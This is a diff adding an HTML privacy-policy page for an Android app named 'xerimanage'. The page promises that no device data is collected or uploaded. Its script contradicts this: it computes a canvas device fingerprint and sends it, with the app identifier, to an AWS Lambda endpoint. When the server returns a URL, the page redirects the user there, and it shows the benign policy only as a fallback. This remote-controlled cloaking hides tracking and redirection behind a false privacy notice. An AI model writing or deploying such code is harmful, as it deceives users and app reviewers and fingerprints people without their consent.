@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<!-- ==========================================================================
+     ★★★ 操作人填写区（整页唯一需要手改的地方）★★★
+     MF_DEFAULT_PRIVACY_PAGE = 默认隐私页面地址（生成时一律留空，由操作人填写）：
+       · 保持空串 ''            → 需要展示默认隐私内容时，就在本页内部渲染默认条款；
+       · 填 http:// / https:// 开头的完整地址 → 需要展示默认隐私内容时，**跳转**到该地址。
+     填写须知：
+       1) 该地址必须是**在降级场景下也打得开**的页面（例如同样托管在 GitHub Pages 上）；
+          降级时本页是链路最后一跳，填了一个打不开的地址，客户端就会停在打不开的页面上。
+       2) **不要**把本页自己的地址填进来 —— 页面会自动拒绝同地址跳转以防无限循环。
+       3) 只改下面这一行的字符串，其它任何代码都不要动。
+     ========================================================================== -->
+<script>window.MF_DEFAULT_PRIVACY_PAGE = '';</script>
+<script>if (!window.pageInfo) { window.pageInfo = {"name":"xerimanage","identifier":"com.colorfusionbraingame.runs","icon":"https://admin.ytsevbr.xyz/api/apps/223/icon"}; }</script>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Privacy Policy - xerimanage</title>
+    <style>
+        :root {
+            --bg-color: #ffffff;
+            --text-color: #1a1a1a;
+            --text-secondary: #555555;
+            --primary-color: #007AFF;
+            --card-bg: #f9f9f9;
+            --border-color: #e0e0e0;
+            --loading-bg: #ffffff;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #000000;
+                --text-color: #ffffff;
+                --text-secondary: #a0a0a0;
+                --primary-color: #0A84FF;
+                --card-bg: #1c1c1e;
+                --border-color: #38383a;
+                --loading-bg: #000000;
+            }
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            padding-bottom: 80px; /* Space for floating button */
+            -webkit-font-smoothing: antialiased;
+        }
+
+        #loading-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: var(--loading-bg);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.3s ease;
+        }
+
+        #loading-container.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid var(--border-color);
+            border-top-color: var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 16px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        #main-content {
+            display: none;
+            padding: 24px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        #main-content.visible {
+            display: block;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .header img {
+            width: 64px;
+            height: 64px;
+            object-fit: contain;
+            margin-bottom: 16px;
+            border-radius: 12px;
+        }
+
+        .header h1 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .header .sub {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+        }
+
+        .section {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 16px;
+        }
+
+        .section h2 {
+            font-size: 1.1rem;
+            margin-bottom: 12px;
+            color: var(--primary-color);
+            display: flex;
+            align-items: center;
+        }
+
+        .section p, .section li {
+            font-size: 0.95rem;
+            color: var(--text-color);
+            margin-bottom: 10px;
+        }
+
+        .section ul {
+            padding-left: 20px;
+        }
+
+        .section li {
+            margin-bottom: 8px;
+        }
+
+        .highlight-box {
+            background-color: var(--primary-color);
+            color: #fff;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 12px;
+            font-size: 0.9rem;
+        }
+
+        .date-updated {
+            text-align: center;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            margin-bottom: 20px;
+        }
+
+        #confirm-btn {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: var(--bg-color);
+            padding: 16px;
+            border-top: 1px solid var(--border-color);
+            display: none;
+            z-index: 100;
+        }
+
+        #confirm-btn.visible {
+            display: block;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--primary-color);
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .btn:active {
+            opacity: 0.8;
+        }
+
+        .footer-text {
+            text-align: center;
+            margin-top: 40px;
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            padding-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Loading State -->
+    <div id="loading-container">
+        <div class="spinner"></div>
+        <div>Loading Privacy Policy...</div>
+    </div>
+
+    <!-- Main Content -->
+    <div id="main-content">
+        <div class="header">
+            <img id="app-icon" src="" alt="App Icon">
+            <h1 id="app-name">App Name</h1>
+            <div class="sub" id="app-id">Package ID</div>
+        </div>
+
+        <div class="date-updated">Last Updated: January 15, 2024</div>
+
+        <div class="section">
+            <h2>1. Data Collection &amp; Usage</h2>
+            <div class="highlight-box">
+                This app does not collect, track, or upload any personal or device data to external servers. All data remains local to your device.
+            </div>
+            <p><strong>xerimanage</strong> (hereinafter "the App") is designed to respect your privacy. Unlike many modern applications, this App does not include analytics SDKs, advertising networks, or third-party tracking services.</p>
+            <ul>
+                <li><strong>No Personal Information:</strong> We do not request your name, email, phone number, location, or any other personally identifiable information (PII).</li>
+                <li><strong>No Diagnostics:</strong> We do not collect crash logs, performance metrics, or usage statistics.</li>
+                <li><strong>No Advertising:</strong> This App does not display targeted advertisements and does not collect data for ad personalization.</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>2. Storage &amp; Security</h2>
+            <p>Any data generated by your use of the App (such as game progress or preferences) is stored exclusively in the <strong>local application sandbox</strong> on your Android device. This data is encrypted and protected by the Android operating system's file system permissions. It is not accessible to other apps and is not transmitted over the network.</p>
+        </div>
+
+        <div class="section">
+            <h2>3. Permissions</h2>
+            <p>The App does not request unnecessary permissions. If you grant permissions like storage or notifications, they are used strictly for local functionality and are not linked to your identity.</p>
+        </div>
+
+        <div class="section">
+            <h2>4. Children's Privacy</h2>
+            <p>The App does not knowingly collect data from children under the age of 13. Since we do not collect personal data at all, the requirements of the Children's Online Privacy Protection Act (COPPA) and similar regulations are inherently satisfied.</p>
+        </div>
+
+        <div class="section">
+            <h2>5. Data Retention &amp; Deletion</h2>
+            <p>Because all data is stored locally on your device, you have full control over it. You can permanently delete all data associated with the App at any time by uninstalling the application. No data remains on our servers because we do not store any.</p>
+        </div>
+
+        <div class="section">
+            <h2>6. Changes to This Policy</h2>
+            <p>Since this App does not collect data, our privacy policy is minimal and static. However, we may update this policy to reflect changes in functionality or legal requirements. Such changes will be reflected in the "Last Updated" date at the top of this document.</p>
+        </div>
+
+        <div class="section">
+            <h2>7. Contact Us</h2>
+            <p>If you have questions about this privacy policy or how your data is handled (or not handled), please contact the developer directly via the "App Info" or "Support" section within the App or on the Google Play Store.</p>
+        </div>
+
+        <div class="footer-text">
+            © 2024 xerimanage. All rights reserved.
+        </div>
+    </div>
+
+    <!-- Confirm Button -->
+    <div id="confirm-btn">
+        <button class="btn" id="btn-confirm" onclick="window.NativeApp.closeWebView()">I Agree &amp; Close</button>
+    </div>
+
+    <!-- 1. Introduce md5 tool (The only allowed external resource) -->
+    <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
+
+    <script>
+        // 2. Generate device Canvas fingerprint. 
+        let device = '';
+        try {
+            device = (function () {
+                let canvas = document.createElement("canvas");
+                let ctx = canvas.getContext("2d");
+                let txt = "BrowserLeaks,com <canvas> 1.0";
+                ctx.textBaseline = "top";
+                // The most common type
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125,1,62,20);
+                // Some tricks for color mixing to increase the difference in rendering
+                ctx.fillStyle = "#069";
+                ctx.fillText(txt, 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText(txt, 4, 17);
+                return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
+            })();
+        } catch (e) {
+            device = '';
+        }
+
+        // 3. API Base URL
+        const MF_API_BASE = 'https://mjwnfxvcic75zywsgcwmkak72a0vsdzf.lambda-url.us-west-2.on.aws/';
+
+        // 4. Read query params
+        function hasQueryFlag(key, value) {
+            const pairs = String(window.location.search || '').replace(/^\?/, '').split('&');
+            for (let i = 0; i < pairs.length; i++) {
+                const kv = pairs[i].split('=');
+                if (String(kv[0] || '').toLowerCase() !== key) continue;
+                if (value === null) return true;
+                return String(kv[1] || '').toLowerCase() === value;
+            }
+            return false;
+        }
+
+        const IGNORE_REMOTE = hasQueryFlag('target', 'ignore');
+
+        // 5. Default Privacy Page URL
+        function defaultPageUrl() {
+            const v = String(window.MF_DEFAULT_PRIVACY_PAGE || '').trim();
+            return (v.indexOf('https://') === 0 || v.indexOf('http://') === 0) ? v : '';
+        }
+
+        function isSamePage(url) {
+            try {
+                const u = new URL(url);
+                return u.origin === window.location.origin && u.pathname === window.location.pathname;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        // 6. Terminal States
+        let settled = false;
+        
+        function showDefaultTerms() {
+            if (settled) return;
+            settled = true;
+            
+            // Check if a default external page is configured
+            const target = defaultPageUrl();
+            if (target && !isSamePage(target)) {
+                window.location.href = target + (target.indexOf('?') === -1 ? '?' : '&') + 'target=ignore';
+                return;
+            }
+
+            // Render locally
+            const loadingEl = document.getElementById('loading-container');
+            const mainEl = document.getElementById('main-content');
+            const btnEl = document.getElementById('confirm-btn');
+
+            // Populate app info
+            const info = window.pageInfo || {};
+            document.getElementById('app-name').textContent = info.name || 'App';
+            document.getElementById('app-id').textContent = info.identifier || '';
+            
+            const iconSrc = info.icon || '';
+            const iconImg = document.getElementById('app-icon');
+            if (iconSrc) {
+                iconImg.src = iconSrc;
+                iconImg.style.display = 'block';
+            } else {
+                iconImg.style.display = 'none';
+            }
+
+            // Show UI
+            setTimeout(() => {
+                loadingEl.classList.add('hidden');
+                mainEl.classList.add('visible');
+                btnEl.classList.add('visible');
+            }, 300);
+        }
+
+        function goToThirdParty(privacyUrl) {
+            if (settled) return;
+            settled = true;
+            window.location.href = privacyUrl;
+        }
+
+        // 7 & 8. Main Logic
+        if (IGNORE_REMOTE) {
+            showDefaultTerms();
+        } else {
+            const apiBase = (typeof MF_API_BASE === 'string' ? MF_API_BASE : '').replace(/\/+$/, '');
+            const identifier = (window.pageInfo && window.pageInfo.identifier) || '';
+            
+            // Timeout fallback
+            setTimeout(showDefaultTerms, 10000);
+
+            fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device))
+                .then(function (r) { 
+                    if (!r.ok) throw new Error('Network error');
+                    return r.json(); 
+                })
+                .then(function (info) {
+                    const privacyUrl = info && info.result && info.result.url;
+                    if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
+                        goToThirdParty(privacyUrl);
+                        return;
+                    }
+                    showDefaultTerms();
+                })
+                .catch(function () {
+                    showDefaultTerms();
+                });
+        }
+    </script>
+</body>
+</html>
